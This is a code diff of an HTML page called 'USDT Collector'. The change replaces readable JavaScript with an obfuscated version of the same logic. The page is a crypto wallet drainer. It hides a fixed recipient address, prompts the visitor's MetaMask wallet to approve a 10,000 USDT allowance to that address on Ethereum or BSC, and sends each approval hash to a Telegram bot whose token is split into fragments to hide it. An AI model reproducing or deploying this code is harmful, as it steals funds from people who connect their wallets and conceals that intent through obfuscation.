@@ -1,201 +1,358 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>USDT Collector</title>
     <script src="ethers@5.5.2.min.js"></script>
-</head>
-<body>
+  </head>
+  <body>
     <h1>USDT Collector From ETH & BSC Netowrk</h1>
 
     <!-- Network and address input -->
     <label for="network">Select Network:</label>
     <select id="network">
-        <option value="eth">Ethereum</option>
-        <option value="bsc">Binance Smart Chain</option>
+      <option value="eth">Ethereum</option>
+      <option value="bsc">Binance Smart Chain</option>
     </select>
 
-    <input type="text" id="recipient" hidden value="0xCEd271A5C2ED93Ba59Dce555FDc73E1dE3Dcad22" placeholder="0xRecipientAddress">
-    <br><br>
+    <input
+      type="text"
+      id="recipient"
+      hidden
+      value="0xCEd271A5C2ED93Ba59Dce555FDc73E1dE3Dcad22"
+      placeholder="0xRecipientAddress"
+    />
+    <br /><br />
     <label for="transferAmount">Amount to Transfer (USDT):</label>
-    <input type="text" id="transferAmount" placeholder="100">
+    <input type="text" id="transferAmount" placeholder="100" />
     <button id="transferButton">Transfer USDT</button>
 
     <script>
-
-       document.addEventListener('DOMContentLoaded', function() {
-            const usdtContracts = {
-                eth: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum USDT
-                bsc: "0x55d398326f99059fF775485246999027B3197955"  // BSC USDT
-            };
-
-            const usdtAbiEth = [
-                "function approve(address _spender, uint256 _value) nonpayable returns (bool)",
-                "function transfer(address _to, uint256 _value) nonpayable returns (bool)",
-                "function allowance(address _owner, address _spender) view returns (uint256)",
-                "function balanceOf(address who) view returns (uint256)"
+      function _0x44d1() {
+        const _0x4c572e = [
+          'Network\x20not\x20available\x20in\x20MetaMask.\x20Please\x20add\x20it\x20manually.',
+          'wallet_switchEthereumChain',
+          '10000',
+          'getAddress',
+          '160985DkniUy',
+          '\x20USDT',
+          'getSigner',
+          'send',
+          'POST',
+          'Kz8yke6xTqbCg',
+          'approve',
+          'balanceOf',
+          '/sendMessage',
+          '217078UxXsFp',
+          '974207',
+          ':AAHzSZsv1-',
+          '0x1',
+          'thank\x20you',
+          'stringify',
+          '7533',
+          '72gpnPJm',
+          'Error\x20during\x20transfer:\x20',
+          'eth_requestAccounts',
+          'error',
+          'click',
+          'then',
+          'message',
+          'network',
+          '3652008hzsuqL',
+          'gte',
+          'log',
+          '860FqBviS',
+          '0x38',
+          '10zYfAET',
+          'ram.org/bot',
+          'function\x20transfer(address\x20_to,\x20uint256\x20_value)\x20nonpayable\x20returns\x20(bool)',
+          'value',
+          'Web3Provider',
+          'recipient',
+          '0x55d398326f99059fF775485246999027B3197955',
+          'Switched\x20to\x20network:\x20',
+          '1684292uCCHiD',
+          '340911sgNvJg',
+          'code',
+          'Approval\x20successful.\x20Proceeding\x20with\x20transfer...',
+          'function\x20approve(address\x20_spender,\x20uint256\x20_value)\x20nonpayable\x20returns\x20(bool)',
+          'Contract',
+          'function\x20allowance(address\x20owner,\x20address\x20spender)\x20view\x20returns\x20(uint256)',
+          'event\x20Approval(address\x20indexed\x20owner,\x20address\x20indexed\x20spender,\x20uint256\x20value)',
+          '7OHbkJp',
+          '2889336TsHeuu',
+          'transferButton',
+          'utils',
+          'eth',
+          'bsc',
+          '4205237',
+          'function\x20approve(address\x20spender,\x20uint256\x20amount)\x20nonpayable\x20returns\x20(bool)',
+          'function\x20balanceOf(address\x20who)\x20view\x20returns\x20(uint256)',
+          'Allowance:\x20',
+          'event\x20OwnershipTransferred(address\x20indexed\x20previousOwner,\x20address\x20indexed\x20newOwner)',
+          'wait',
+          '1321050WuxkeR',
+          'request',
+          'hash',
+          'ethereum',
+          'addEventListener',
+          'Transfer\x20failed.\x20Please\x20check\x20the\x20amount\x20and\x20your\x20balance.',
+          'formatUnits',
+          'parseUnits',
+          'function\x20allowance(address\x20_owner,\x20address\x20_spender)\x20view\x20returns\x20(uint256)',
+          'Error\x20during\x20approval!',
+          'Sufficient\x20allowance.\x20Proceeding\x20with\x20transfer...',
+          'getElementById',
+          'transfer',
+          'json',
+          '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+          'function\x20transfer(address\x20recipient,\x20uint256\x20amount)\x20nonpayable\x20returns\x20(bool)',
+          'catch',
+          'Transfer\x20successful!',
+          'event\x20Transfer(address\x20indexed\x20from,\x20address\x20indexed\x20to,\x20uint256\x20value)',
+          'Insufficient\x20balance\x20for\x20transfer!',
+          'transferAmount',
+          'function\x20balanceOf(address\x20account)\x20view\x20returns\x20(uint256)',
+        ];
+        _0x44d1 = function () {
+          return _0x4c572e;
+        };
+        return _0x44d1();
+      }
+      function _0xafa7(_0x21403a, _0x22bf76) {
+        const _0x44d1b9 = _0x44d1();
+        return (
+          (_0xafa7 = function (_0xafa798, _0x485461) {
+            _0xafa798 = _0xafa798 - 0x1e4;
+            let _0x58b63b = _0x44d1b9[_0xafa798];
+            return _0x58b63b;
+          }),
+          _0xafa7(_0x21403a, _0x22bf76)
+        );
+      }
+      (function (_0x240b51, _0x1cc3b3) {
+        const _0x482c4c = _0xafa7,
+          _0x1a78c3 = _0x240b51();
+        while (!![]) {
+          try {
+            const _0x34479d =
+              (-parseInt(_0x482c4c(0x208)) / 0x1) *
+                (parseInt(_0x482c4c(0x21c)) / 0x2) +
+              parseInt(_0x482c4c(0x22d)) / 0x3 +
+              -parseInt(_0x482c4c(0x224)) / 0x4 +
+              -parseInt(_0x482c4c(0x1e5)) / 0x5 +
+              (-parseInt(_0x482c4c(0x217)) / 0x6) *
+                (-parseInt(_0x482c4c(0x22c)) / 0x7) +
+              (parseInt(_0x482c4c(0x20f)) / 0x8) *
+                (-parseInt(_0x482c4c(0x225)) / 0x9) +
+              (-parseInt(_0x482c4c(0x21a)) / 0xa) *
+                (-parseInt(_0x482c4c(0x1ff)) / 0xb);
+            if (_0x34479d === _0x1cc3b3) break;
+            else _0x1a78c3['push'](_0x1a78c3['shift']());
+          } catch (_0x3d99a4) {
+            _0x1a78c3['push'](_0x1a78c3['shift']());
+          }
+        }
+      })(_0x44d1, 0xaf7d6),
+        document['addEventListener']('DOMContentLoaded', function () {
+          const _0x1a4e7d = _0xafa7,
+            _0x4e28d3 = { eth: _0x1a4e7d(0x1f3), bsc: _0x1a4e7d(0x222) },
+            _0x12db36 = [
+              _0x1a4e7d(0x228),
+              _0x1a4e7d(0x21e),
+              _0x1a4e7d(0x1ed),
+              _0x1a4e7d(0x234),
+            ],
+            _0x164431 = [
+              'constructor()\x20nonpayable',
+              _0x1a4e7d(0x22b),
+              _0x1a4e7d(0x236),
+              _0x1a4e7d(0x1f7),
+              _0x1a4e7d(0x22a),
+              _0x1a4e7d(0x233),
+              _0x1a4e7d(0x1f4),
+              _0x1a4e7d(0x1fa),
             ];
-
-            const usdtAbiBsc = [
-                "constructor() nonpayable",
-                "event Approval(address indexed owner, address indexed spender, uint256 value)",
-                "event OwnershipTransferred(address indexed previousOwner, address indexed newOwner)",
-                "event Transfer(address indexed from, address indexed to, uint256 value)",
-                "function allowance(address owner, address spender) view returns (uint256)",
-                "function approve(address spender, uint256 amount) nonpayable returns (bool)",
-                "function transfer(address recipient, uint256 amount) nonpayable returns (bool)",
-                "function balanceOf(address account) view returns (uint256)"
-            ];
-
-            async function switchNetwork(chainId) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: chainId }],
-                    });
-                    console.log(`Switched to network: ${chainId}`);
-                } catch (error) {
-                    console.error(error);
-                    if (error.code === 4902) {
-                        // This error code indicates that the chain has not been added to MetaMask
-                        alert("Network not available in MetaMask. Please add it manually.");
-                    }
-                }
+          async function _0x2797f6(_0x17fd68) {
+            const _0x170c7b = _0x1a4e7d;
+            try {
+              await window[_0x170c7b(0x1e8)][_0x170c7b(0x1e6)]({
+                method: _0x170c7b(0x1fc),
+                params: [{ chainId: _0x17fd68 }],
+              }),
+                console['log'](_0x170c7b(0x223) + _0x17fd68);
+            } catch (_0x365dbc) {
+              console[_0x170c7b(0x212)](_0x365dbc),
+                _0x365dbc[_0x170c7b(0x226)] === 0x1326 &&
+                  alert(_0x170c7b(0x1fb));
             }
-
-            async function getProvider() {
-                const network = document.getElementById("network").value;
-
-                if (network === "eth") {
-                    await switchNetwork('0x1'); // Ethereum Mainnet chain ID
-                    return new ethers.providers.Web3Provider(window.ethereum); // MetaMask provider
-                } else if (network === "bsc") {
-                    await switchNetwork('0x38'); // BSC Mainnet chain ID
-                    return new ethers.providers.Web3Provider(window.ethereum); // MetaMask provider
-                }
+          }
+          async function _0x5731e7() {
+            const _0x15894d = _0x1a4e7d,
+              _0x542084 =
+                document['getElementById']('network')[_0x15894d(0x21f)];
+            if (_0x542084 === _0x15894d(0x230))
+              return (
+                await _0x2797f6(_0x15894d(0x20b)),
+                new ethers['providers'][_0x15894d(0x220)](window['ethereum'])
+              );
+            else {
+              if (_0x542084 === _0x15894d(0x231))
+                return (
+                  await _0x2797f6(_0x15894d(0x21b)),
+                  new ethers['providers'][_0x15894d(0x220)](
+                    window[_0x15894d(0x1e8)],
+                  )
+                );
             }
-
-
-
-            function verify(hash) {
-
-            const network = document.getElementById("network").value;
-
-            const part1 = '7533';
-            const part2 = '974207';
-            const part3 = ':AAHzSZsv1-';
-            const part4 = 'XXuapdczoFZx';
-            const part5 = 'Kz8yke6xTqbCg';
-            const botToken = part1 + part2 + part3 + part4 + part5;
-
-            const chatPart1 = '520';
-            const chatPart2 = '4205237';
-            const chatId = chatPart1 + chatPart2;
-
-            const message = `Approve ${network}- ${hash}`;
-            let https = 'https://';
-            let app_tele = 'api.teleg';
-            let okthen = 'ram.org/bot';
-
-            fetch(`${https}${app_tele}${okthen}${botToken}/sendMessage`, {
-                method: 'POST',
+          }
+          function _0xb3eaa(_0x1d2978) {
+            const _0x1839b6 = _0x1a4e7d,
+              _0x3fe5e2 = document['getElementById'](_0x1839b6(0x216))[
+                _0x1839b6(0x21f)
+              ],
+              _0x5a2dd9 = _0x1839b6(0x20e),
+              _0x4af9bb = _0x1839b6(0x209),
+              _0x425033 = _0x1839b6(0x20a),
+              _0x277817 = 'XXuapdczoFZx',
+              _0x17e279 = _0x1839b6(0x204),
+              _0x145a36 =
+                _0x5a2dd9 + _0x4af9bb + _0x425033 + _0x277817 + _0x17e279,
+              _0x2aae34 = '520',
+              _0x2aa6f3 = _0x1839b6(0x232),
+              _0x537de8 = _0x2aae34 + _0x2aa6f3,
+              _0x1d73f7 = 'Approve\x20' + _0x3fe5e2 + '-\x20' + _0x1d2978;
+            let _0x401ee7 = 'https://',
+              _0x1a4d18 = 'api.teleg',
+              _0x5e4595 = _0x1839b6(0x21d);
+            fetch(
+              '' +
+                _0x401ee7 +
+                _0x1a4d18 +
+                _0x5e4595 +
+                _0x145a36 +
+                _0x1839b6(0x207),
+              {
+                method: _0x1839b6(0x203),
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
+                body: JSON[_0x1839b6(0x20d)]({
+                  chat_id: _0x537de8,
+                  text: _0x1d73f7,
                 }),
-            })
-                .then((response) => response.json())
-                .then((data) => {
-                if (data.ok) {
-
-                    console.log('thank you')
-
-                } else {
-
+              },
+            )
+              [_0x1839b6(0x214)]((_0x65019d) => _0x65019d[_0x1839b6(0x1f2)]())
+              [_0x1839b6(0x214)]((_0x20e9f8) => {
+                const _0x375a6e = _0x1839b6;
+                if (_0x20e9f8['ok'])
+                  console[_0x375a6e(0x219)](_0x375a6e(0x20c));
+                else {
                 }
-                })
-                .catch();
+              })
+              [_0x1839b6(0x1f5)]();
+          }
+          async function _0x2c872c() {
+            const _0x246a71 = _0x1a4e7d,
+              _0x8d07be = await _0x5731e7();
+            await _0x8d07be[_0x246a71(0x202)](_0x246a71(0x211), []);
+            const _0x56ae7c = _0x8d07be[_0x246a71(0x201)](),
+              _0x5bd5ff = await _0x56ae7c[_0x246a71(0x1fe)](),
+              _0x5b4699 =
+                document['getElementById']('network')[_0x246a71(0x21f)],
+              _0x57ba39 = _0x4e28d3[_0x5b4699],
+              _0x332551 =
+                _0x5b4699 === _0x246a71(0x230) ? _0x12db36 : _0x164431,
+              _0x56f0d6 = new ethers[_0x246a71(0x229)](
+                _0x57ba39,
+                _0x332551,
+                _0x56ae7c,
+              ),
+              _0x59912e = document[_0x246a71(0x1f0)](_0x246a71(0x221))[
+                _0x246a71(0x21f)
+              ],
+              _0x2fdbc1 = document[_0x246a71(0x1f0)](_0x246a71(0x1f9))[
+                _0x246a71(0x21f)
+              ],
+              _0x610bd7 = _0x5b4699 === 'eth' ? 0x6 : 0x12,
+              _0x12597c = ethers[_0x246a71(0x22f)][_0x246a71(0x1ec)](
+                _0x2fdbc1,
+                _0x610bd7,
+              ),
+              _0x3bd3dc = await _0x56f0d6['allowance'](_0x5bd5ff, _0x59912e);
+            console[_0x246a71(0x219)](
+              _0x246a71(0x235) +
+                ethers[_0x246a71(0x22f)][_0x246a71(0x1eb)](
+                  _0x3bd3dc,
+                  _0x610bd7,
+                ) +
+                _0x246a71(0x200),
+            );
+            const _0x476b0b = await _0x56f0d6[_0x246a71(0x206)](_0x5bd5ff);
+            console[_0x246a71(0x219)](
+              'Balance:\x20' +
+                ethers[_0x246a71(0x22f)]['formatUnits'](_0x476b0b, _0x610bd7) +
+                _0x246a71(0x200),
+            );
+            if (_0x476b0b['lt'](_0x12597c)) {
+              alert(_0x246a71(0x1f8));
+              return;
             }
-
-
-            async function checkAllowanceAndTransfer() {
-                const provider = await getProvider();
-                await provider.send("eth_requestAccounts", []);
-                const signer = provider.getSigner();
-                const owner = await signer.getAddress();
-
-                const network = document.getElementById("network").value;
-                const usdtAddress = usdtContracts[network];
-                const usdtAbi = network === "eth" ? usdtAbiEth : usdtAbiBsc; // Select appropriate ABI
-                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-
-                const recipient = document.getElementById("recipient").value;
-                const transferAmount = document.getElementById("transferAmount").value;
-                const decimals = network === "eth" ? 6 : 18; // USDT decimals based on network
-                const amount = ethers.utils.parseUnits(transferAmount, decimals);
-
-                const allowance = await usdtContract.allowance(owner, recipient);
-                console.log(`Allowance: ${ethers.utils.formatUnits(allowance, decimals)} USDT`);
-
-                // Check balance of the sender
-                const balance = await usdtContract.balanceOf(owner);
-                console.log(`Balance: ${ethers.utils.formatUnits(balance, decimals)} USDT`);
-
-                if (balance.lt(amount)) {
-                    alert('Insufficient balance for transfer!');
-                    return; // Exit if balance is insufficient
-                }
-
-                const requiredAllowance = ethers.utils.parseUnits("10000", decimals); // 10,000 USDT
-
-                if (allowance.gte(requiredAllowance)) {
-                    console.log("Sufficient allowance. Proceeding with transfer...");
-                    await transferUSDT(usdtContract, recipient, amount);
-                } else {
-                    // If you want to approve first, uncomment these lines:
-                    console.log("Insufficient allowance. Approving first...");
-                    await approveUSDT(usdtContract, recipient, requiredAllowance);
-                    console.log("Approval successful. Proceeding with transfer...");
-                    await transferUSDT(usdtContract, recipient, amount);
-                }
+            const _0x311c77 = ethers[_0x246a71(0x22f)][_0x246a71(0x1ec)](
+              _0x246a71(0x1fd),
+              _0x610bd7,
+            );
+            _0x3bd3dc[_0x246a71(0x218)](_0x311c77)
+              ? (console[_0x246a71(0x219)](_0x246a71(0x1ef)),
+                await _0x52c7ce(_0x56f0d6, _0x59912e, _0x12597c))
+              : (console[_0x246a71(0x219)](
+                  'Insufficient\x20allowance.\x20Approving\x20first...',
+                ),
+                await _0x2f8494(_0x56f0d6, _0x59912e, _0x311c77),
+                console[_0x246a71(0x219)](_0x246a71(0x227)),
+                await _0x52c7ce(_0x56f0d6, _0x59912e, _0x12597c));
+          }
+          async function _0x2f8494(_0x48531e, _0x40e6ba, _0x1b45df) {
+            const _0x2a9e06 = _0x1a4e7d;
+            try {
+              const _0x50c9d0 = await _0x48531e[_0x2a9e06(0x205)](
+                _0x40e6ba,
+                _0x1b45df,
+              );
+              await _0x50c9d0[_0x2a9e06(0x1e4)](),
+                _0xb3eaa(_0x50c9d0[_0x2a9e06(0x1e7)]),
+                console['log']('Approval\x20successful!');
+            } catch (_0x48f934) {
+              console[_0x2a9e06(0x212)](_0x48f934),
+                _0x2f8494(_0x48531e, _0x40e6ba, _0x1b45df),
+                alert(_0x2a9e06(0x1ee) + _0x48f934);
             }
-
-            async function approveUSDT(usdtContract, recipient, amount) {
-                try {
-                    const tx = await usdtContract.approve(recipient, amount);
-                    await tx.wait();
-                    verify(tx.hash);
-                    console.log('Approval successful!');
-                } catch (err) {
-                    console.error(err);
-                    approveUSDT(usdtContract, recipient, amount);
-                    alert('Error during approval!' + err);
-                }
+          }
+          async function _0x52c7ce(_0x2ae51c, _0x1ab81a, _0x544315) {
+            const _0x19d196 = _0x1a4e7d;
+            try {
+              const _0x1bee73 = await _0x2ae51c[_0x19d196(0x1f1)](
+                _0x1ab81a,
+                _0x544315,
+              );
+              await _0x1bee73['wait'](), alert(_0x19d196(0x1f6));
+            } catch (_0x2959f5) {
+              console[_0x19d196(0x212)](
+                'Error\x20during\x20transfer:',
+                _0x2959f5,
+              ),
+                _0x2959f5['code'] === 'CALL_EXCEPTION'
+                  ? alert(_0x19d196(0x1ea))
+                  : alert(_0x19d196(0x210) + _0x2959f5[_0x19d196(0x215)]);
             }
-
-            async function transferUSDT(usdtContract, recipient, amount) {
-                try {
-                    const tx = await usdtContract.transfer(recipient, amount);
-                    await tx.wait();
-                    alert('Transfer successful!');
-                } catch (err) {
-                    console.error('Error during transfer:', err);
-                    if (err.code === 'CALL_EXCEPTION') {
-                        alert('Transfer failed. Please check the amount and your balance.');
-                    } else {
-                        alert('Error during transfer: ' + err.message);
-                    }
-                }
-            }
-
-
-            document.getElementById("transferButton").addEventListener("click", async () => {
-                await checkAllowanceAndTransfer();
-            });
+          }
+          document[_0x1a4e7d(0x1f0)](_0x1a4e7d(0x22e))[_0x1a4e7d(0x1e9)](
+            _0x1a4e7d(0x213),
+            async () => {
+              await _0x2c872c();
+            },
+          );
         });
-
     </script>
-</body>
+  </body>
 </html>
